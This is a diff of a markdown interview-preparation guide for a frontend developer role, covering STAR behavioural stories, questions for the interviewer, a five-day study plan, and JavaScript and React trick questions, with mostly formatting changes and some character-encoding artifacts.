+| --------------------------- | -------------------- | ------------------------------------- | -------------------------- | ----------------------- | --------------------- |
+| **Technical Conflict**      | ******\_\_\_\_****** | Brief context of disagreement         | Your goal                  | What you did to resolve | Measurable outcome    |
+| **Ownership & Initiative**  | ******\_\_\_\_****** | Problem you identified                | What you decided to do     | How you drove it        | Impact (metrics)      |
+| **Handling Failure**        | ******\_\_\_\_****** | What went wrong                       | Your responsibility        | How you fixed + learned | Recovery + prevention |
+| **Cross-Functional Collab** | ******\_\_\_\_****** | Who you worked with, what was unclear | What you needed to achieve | How you collaborated    | Outcome for project   |
+| **Adapting to Change**      | ******\_\_\_\_****** | What changed mid-project              | Challenge this created     | How you adapted         | Final result          |
 
 **Example filled row (Technical Conflict):**
 
-| Category | Project | S | T | A | R |
-|---|---|---|---|---|---|
+| Category           | Project             | S                                                                           | T                                                   | A                                                                                                                                                     | R                                                                                          |
+| ------------------ | ------------------- | --------------------------------------------------------------------------- | --------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------ |
 | Technical Conflict | E-commerce checkout | Team wanted to use Redux for form state. I thought local state was simpler. | Decide on state management without delaying sprint. | I built 2 POCs (Redux vs useState), measured bundle size (+40KB for Redux), presented in tech review. Team agreed local state was sufficient for MVP. | Shipped 2 days early, no bugs. Team adopted "start simple" principle for future decisions. |
 
 **Tips:**
+
 - âœ… Use bullet points when filling this out (you'll expand to full sentences during the interview)
 - âœ… Rehearse each story out loud â€” aim for 2 minutes max
 - âœ… Have backup stories â€” if one doesn't fit the question, pivot to another
@@ -3778,6 +4005,7 @@ These patterns make interviewers skeptical. Avoid them:
 "Cart abandonment decreased 12%, translating to $30K additional monthly revenue."
 
 **If you don't have exact numbers:**
+
 - Estimate conservatively ("roughly 30% faster")
 - Use qualitative + quantitative ("5 customers mentioned it in feedback, and support tickets for slow checkout dropped from 20/week to 3/week")
 
@@ -3788,12 +4016,14 @@ These patterns make interviewers skeptical. Avoid them:
 Interviewers zone out after 2 minutes. Practice with a timer.
 
 **Structure:**
+
 - S: 15 seconds
 - T: 15 seconds
 - A: 60 seconds (bulk of the story)
 - R: 30 seconds
 
 **If you run long:**
+
 - Cut background details ("The company was a startup..." â†’ not needed)
 - Skip minor actions ("I also refactored some CSS..." â†’ focus on high-impact actions)
 - Pause after A and ask: "Would you like more detail on [specific part]?"
@@ -3829,48 +4059,48 @@ Prepare 5â€“7 questions. Pick 2â€“3 based on how the interview went.
 #### Technical Culture (Choose 1â€“2)
 
 1. **"What does your code review process look like? Do you have style guides or automated linting?"**  
-   *Why ask:* Shows you care about code quality and team standards.
+   _Why ask:_ Shows you care about code quality and team standards.
 
 2. **"How do you handle technical debt? Do you allocate explicit sprint capacity for refactoring, or is it tackled opportunistically?"**  
-   *Why ask:* Tests whether they balance feature velocity with long-term maintainability.
+   _Why ask:_ Tests whether they balance feature velocity with long-term maintainability.
 
 3. **"Can you walk me through how a typical project moves from Cadrage to Livraison? Where do engineers get involved?"**  
-   *Why ask:* AEON-specific; shows you researched their 4-phase methodology.
+   _Why ask:_ AEON-specific; shows you researched their 4-phase methodology.
 
 4. **"What's your approach to balancing client requests with technical best practices? Any examples where you pushed back?"**  
-   *Why ask:* AEON works on client projects; this tests how they handle scope creep.
+   _Why ask:_ AEON works on client projects; this tests how they handle scope creep.
 
 ---
 
 #### Process & Workflow (Choose 1â€“2)
 
 5. **"How do you manage multiple client projects concurrently? Do engineers work on one client at a time or context-switch?"**  
-   *Why ask:* AEON likely juggles 5â€“10 clients. This affects your day-to-day focus.
+   _Why ask:_ AEON likely juggles 5â€“10 clients. This affects your day-to-day focus.
 
 6. **"What does your deployment process look like? How frequently do you deploy to production?"**  
-   *Why ask:* Tests engineering maturity (daily deploys vs monthly releases).
+   _Why ask:_ Tests engineering maturity (daily deploys vs monthly releases).
 
 7. **"How do you handle production incidents? Is there an on-call rotation, or does the person who wrote the code fix it?"**  
-   *Why ask:* Reveals work-life balance and ownership culture.
+   _Why ask:_ Reveals work-life balance and ownership culture.
 
 8. **"What tools do you use for project management? I saw you use Jira â€” how structured are your sprints?"**  
-   *Why ask:* AEON mentions Jira and Scrum; this tests how rigidly they follow Agile.
+   _Why ask:_ AEON mentions Jira and Scrum; this tests how rigidly they follow Agile.
 
 ---
 
 #### Growth & Career (Choose 1â€“2)
 
 9. **"What learning opportunities exist? Conference budget, internal tech talks, dedicated time for learning new tech?"**  
-   *Why ask:* Signals you're invested in long-term growth, not just a paycheck.
+   _Why ask:_ Signals you're invested in long-term growth, not just a paycheck.
 
 10. **"How do you mentor junior engineers? Is there a structured program or more ad-hoc?"**  
-    *Why ask:* Even as an IC, you may mentor juniors. This tests their investment in team growth.
+    _Why ask:_ Even as an IC, you may mentor juniors. This tests their investment in team growth.
 
 11. **"What does the career path look like for an IC engineer here? Can you reach principal/staff level without managing people?"**  
-    *Why ask:* Critical if you want to stay technical long-term. Some companies force ICs into management.
+    _Why ask:_ Critical if you want to stay technical long-term. Some companies force ICs into management.
 
 12. **"What's the most exciting project the team has worked on in the past year?"**  
-    *Why ask:* Open-ended; lets them brag. Reveals what they're proud of.
+    _Why ask:_ Open-ended; lets them brag. Reveals what they're proud of.
 
 ---
 
@@ -3896,11 +4126,13 @@ Before June 9th:
 - [ ] Review AEON360's methodology (Cadrage â†’ Conception â†’ DÃ©veloppement â†’ Livraison) so you can reference it naturally
 
 **Day before interview:**
+
 - Skim your Story Bank Worksheet bullet points (don't memorize word-for-word)
 - Pick your top 3 questions to ask based on what you most care about
 - Get 8 hours of sleep
 
 **During interview:**
+
 - Listen carefully to the question â€” answer what they asked, not what you prepared
 - If a question doesn't fit your prepared stories, say: "Let me think of a good example..." (10 seconds of silence is okay)
 - If you blank on a story, pivot: "I don't have a perfect example for that, but here's a related situation where [close enough]"
@@ -3908,7 +4140,6 @@ Before June 9th:
 You're ready. Trust your prep.
 
 ---
-
 
 ## Phase 10 â€” 5-Day Study Plan (June 4â€“9, 2026)
 
@@ -3921,6 +4152,7 @@ You're ready. Trust your prep.
 ### June 4 (Wednesday) â€” System Design Foundations
 
 **Morning (60 min)**
+
 - [ ] Read **Section 8.1 (Whiteboard Coding Tips)** and **8.2 (System Design Framework)**
 - [ ] Write out the 5-step framework on paper:
   1. Clarify requirements
@@ -3931,6 +4163,7 @@ You're ready. Trust your prep.
 - [ ] Keep this paper with you â€” use it as a reference for the next 5 days
 
 **Afternoon (75 min)**
+
 - [ ] Work through **Example 1: Autocomplete Search**
   - Read the full example (30 min)
   - On paper/whiteboard, redraw the component tree without looking (10 min)
@@ -3942,6 +4175,7 @@ You're ready. Trust your prep.
   - Sketch the data flow on paper (5 min)
 
 **Evening (30 min)**
+
 - [ ] Practice whiteboarding Example 1 on paper
   - Set a timer for 15 minutes
   - Write the `AutocompleteSearch` component signature, state, and debounced effect (pseudocode is fine)
@@ -3957,6 +4191,7 @@ You're ready. Trust your prep.
 ### June 5 (Thursday) â€” Advanced System Design + Security/Performance Refresh
 
 **Morning (90 min)**
+
 - [ ] Work through **Example 3: Real-Time Dashboard with WebSocket**
   - Read the full example (40 min)
   - Write out the WebSocket lifecycle on paper: open â†’ message â†’ error â†’ close â†’ reconnect (5 min)
@@ -3967,6 +4202,7 @@ You're ready. Trust your prep.
   - Sketch the form validation flow on paper (5 min)
 
 **Afternoon (60 min)**
+
 - [ ] Practice whiteboarding Example 3 on paper
   - Set a timer for 20 minutes
   - Write the WebSocket connection logic (pseudocode)
@@ -3980,6 +4216,7 @@ You're ready. Trust your prep.
   - Refresh code splitting, lazy loading, caching strategies
 
 **Evening (30 min)**
+
 - [ ] Skim **Section 8.4 (Trade-Off Discussion Templates)**
   - Pick 3 trade-offs and practice answering out loud:
     - "When would you use useState vs Context?"
@@ -3996,6 +4233,7 @@ You're ready. Trust your prep.
 ### June 6 (Friday) â€” System Design Wrap-Up + Behavioral Prep Kickoff
 
 **Morning (60 min)**
+
 - [ ] Work through **Example 5: Image Gallery with Lazy Loading**
   - Read the full example (30 min)
   - Explain out loud: "Intersection Observer triggers image load when in viewport..." (5 min)
@@ -4005,6 +4243,7 @@ You're ready. Trust your prep.
   - For each, think of a past project where you could have fallen into that trap
 
 **Afternoon (90 min)**
+
 - [ ] Read **Section 9.1: STAR Format Explained** (30 min)
   - Study the Good vs Bad examples
   - Note the structure: S (15s) â†’ T (15s) â†’ A (60s) â†’ R (30s) = 2 min total
@@ -4018,6 +4257,7 @@ You're ready. Trust your prep.
   - For each category, think of **one** story from your past experience (don't write it yet, just identify which project)
 
 **Evening (45 min)**
+
 - [ ] Fill out the **Story Bank Worksheet (Section 9.3)**
   - Use bullet points (full sentences come later)
   - Aim for 5 stories, one per category
@@ -4033,6 +4273,7 @@ You're ready. Trust your prep.
 ### June 7 (Saturday) â€” Behavioral Rehearsal + Whiteboard Drills
 
 **Morning (90 min)**
+
 - [ ] Rehearse all 5 STAR stories **out loud** (60 min)
   - Set a timer for 2 minutes per story
   - Stand up (or sit at a desk) as if you're in the interview
@@ -4044,6 +4285,7 @@ You're ready. Trust your prep.
   - Check for "we" vs "I" â€” rephrase to emphasize your ownership
 
 **Afternoon (75 min)**
+
 - [ ] Whiteboard practice â€” **2 random system design examples** (60 min)
   - Close the guide
   - Pick 2 examples at random (use a dice roll or random.org):
@@ -4062,6 +4304,7 @@ You're ready. Trust your prep.
   - Did you forget TypeScript generics syntax? Skim Phase 1.
 
 **Evening (45 min)**
+
 - [ ] Review **Non-Negotiables Checklist** (existing section in guide)
   - Go through each item â€” can you answer/code all of them?
   - Drill any you're shaky on:
@@ -4083,6 +4326,7 @@ You're ready. Trust your prep.
 ### June 8 (Sunday) â€” Final Review + Rest
 
 **Morning (90 min max â€” then STOP studying)**
+
 - [ ] **Skim all 5 system design examples** (30 min)
   - Don't re-read in full
   - Just glance at the component trees, state structures, and key code snippets
@@ -4099,6 +4343,7 @@ You're ready. Trust your prep.
   - These often come up in technical discussions during behavioral rounds
 
 **Afternoon + Evening: NO STUDYING**
+
 - [ ] Do something unrelated to coding:
   - Walk, exercise, watch a movie, cook, hang out with friends/family
   - Your brain needs rest to consolidate what you've learned
@@ -4124,6 +4369,7 @@ You're ready. Trust your prep.
 **Morning (before interview)**
 
 **If your interview is at 9 AM:**
+
 - Wake up 2 hours early (7 AM)
 - Light breakfast (avoid heavy food that makes you sluggish)
 - 20-minute review ONLY:
@@ -4133,6 +4379,7 @@ You're ready. Trust your prep.
 - Arrive 10 minutes early (or log in 5 minutes early if virtual)
 
 **If your interview is in the afternoon:**
+
 - Follow your normal morning routine
 - Do a light 30-minute review mid-morning (same checklist as above)
 - Eat a normal lunch (not too heavy)
@@ -4141,6 +4388,7 @@ You're ready. Trust your prep.
 **During the interview:**
 
 **System Design / Technical Round:**
+
 - [ ] **Clarify requirements first** (use the 5-step framework from 8.2)
   - Don't dive straight into code
   - Ask: scale? performance budget? browser support? accessibility?
@@ -4160,6 +4408,7 @@ You're ready. Trust your prep.
   - Ask for a hint if needed ("I'm blanking on the Intersection Observer API â€” can I assume it exists and move on?")
 
 **Behavioral Round:**
+
 - [ ] **Listen carefully to the question**
   - Don't just recite your prepared story if it doesn't fit
   - Pause for 5 seconds to pick the best story
@@ -4175,6 +4424,7 @@ You're ready. Trust your prep.
   - Answer briefly and ask if they want more detail
 
 **At the end:**
+
 - [ ] **Ask 2â€“3 of your prepared questions** (from Section 9.5)
   - Pick based on what wasn't already answered during the interview
   - Avoid yes/no questions â€” ask open-ended ones
@@ -4182,6 +4432,7 @@ You're ready. Trust your prep.
   - "I really enjoyed learning about [specific project they mentioned]. Thanks for the thoughtful questions."
 
 **After the interview:**
+
 - [ ] **Debrief (optional but helpful for growth)**
   - Write down:
     - What questions they asked
@@ -4211,15 +4462,18 @@ By June 9th, you will have:
 If your interview was moved up or you're starting late:
 
 **2-day plan (June 7â€“8):**
+
 - Day 1: System design framework (8.2) + Examples 1, 2, 3 (whiteboard practice for 1 example)
 - Day 2: STAR format (9.1) + fill out Story Bank (9.3) + rehearse 3 stories + review Non-Negotiables Checklist
 
 **1-day plan (June 8):**
+
 - Morning: System design framework (8.2) + Example 1 (autocomplete) + whiteboard practice
 - Afternoon: STAR format (9.1) + draft 3 stories (conflict, ownership, failure)
 - Evening: Review Non-Negotiables Checklist + Questions to Ask Interviewer (9.5)
 
 **Day-of prep (June 9 morning only):**
+
 - Read Section 8.1 (Whiteboard Tips) + 8.2 (Framework)
 - Read Section 9.1 (STAR Format) + skim one example per category (9.2)
 - Review Non-Negotiables Checklist
@@ -4232,6 +4486,7 @@ If your interview was moved up or you're starting late:
 You've already passed the **hardest filter** â€” the Coderbyte assessment. That proves you can code under pressure.
 
 The physical interview tests **different skills:**
+
 - Can you architect solutions at a high level?
 - Can you explain your reasoning clearly?
 - Can you collaborate and take feedback?
@@ -4244,7 +4499,6 @@ Trust your prep. Stay calm. Communicate clearly. You've got this.
 **Good luck on June 9th!**
 
 ---
-
 
 ---
 
@@ -4259,12 +4513,12 @@ Trust your prep. Stay calm. Communicate clearly. You've got this.
 
 ### Time management
 
-| Challenge type | Time target |
-|---|---|
-| Algorithmic (easy) | 10â€“15 min |
-| Algorithmic (medium) | 20â€“30 min |
-| Frontend UI component | 30â€“45 min |
-| Concept / MCQ | 1â€“2 min each |
+| Challenge type        | Time target    |
+| --------------------- | -------------- |
+| Algorithmic (easy)    | 10â€“15 min    |
+| Algorithmic (medium)  | 20â€“30 min    |
+| Frontend UI component | 30â€“45 min    |
+| Concept / MCQ         | 1â€“2 min each |
 
 A working but incomplete solution beats a perfect unfinished one. Always submit something.
 
@@ -4277,20 +4531,20 @@ A working but incomplete solution beats a perfect unfinished one. Always submit 
 
 ### Algorithmic problem patterns
 
-| Pattern | When to use |
-|---|---|
-| Two pointers | Sorted array, find pair/triplet |
-| Sliding window | Subarray/substring of length k |
-| HashMap/Set | Count frequencies, find duplicates |
-| Stack | Balanced brackets, undo operations |
-| Recursion | Tree traversal, divide and conquer |
+| Pattern        | When to use                        |
+| -------------- | ---------------------------------- |
+| Two pointers   | Sorted array, find pair/triplet    |
+| Sliding window | Subarray/substring of length k     |
+| HashMap/Set    | Count frequencies, find duplicates |
+| Stack          | Balanced brackets, undo operations |
+| Recursion      | Tree traversal, divide and conquer |
 
 ```js
 // HashMap frequency count â€” appears constantly
 function firstNonRepeating(str) {
   const freq = {};
   for (const ch of str) freq[ch] = (freq[ch] ?? 0) + 1;
-  return str.split('').find(ch => freq[ch] === 1) ?? '';
+  return str.split("").find((ch) => freq[ch] === 1) ?? "";
 }
 ```
 
@@ -4315,14 +4569,13 @@ Before your interview, you must be able to answer or code these without hesitati
 
 ## Quick reference â€” things interviewers often trick you on
 
-| Trap | Correct answer |
-|---|---|
-| `typeof null` | `"object"` (historical bug in JS) |
-| `0.1 + 0.2 === 0.3` | `false` (floating point precision) |
-| `[] == false` | `true` (type coercion â€” reason to always use `===`) |
-| `var` in a loop with setTimeout | Captures the final value, use `let` instead |
-| Mutating state directly in React | Never â€” always return a new reference |
+| Trap                                | Correct answer                                                   |
+| ----------------------------------- | ---------------------------------------------------------------- |
+| `typeof null`                       | `"object"` (historical bug in JS)                                |
+| `0.1 + 0.2 === 0.3`                 | `false` (floating point precision)                               |
+| `[] == false`                       | `true` (type coercion â€” reason to always use `===`)            |
+| `var` in a loop with setTimeout     | Captures the final value, use `let` instead                      |
+| Mutating state directly in React    | Never â€” always return a new reference                          |
 | `useEffect` with missing dependency | Stale closure â€” always add all referenced values to deps array |
-| Storing JWT in localStorage | Security risk â€” prefer httpOnly cookie |
-| `async/await` without try/catch | Unhandled rejection â€” always wrap in try/catch |
-
+| Storing JWT in localStorage         | Security risk â€” prefer httpOnly cookie                         |
+| `async/await` without try/catch     | Unhandled rejection â€” always wrap in try/catch                 |
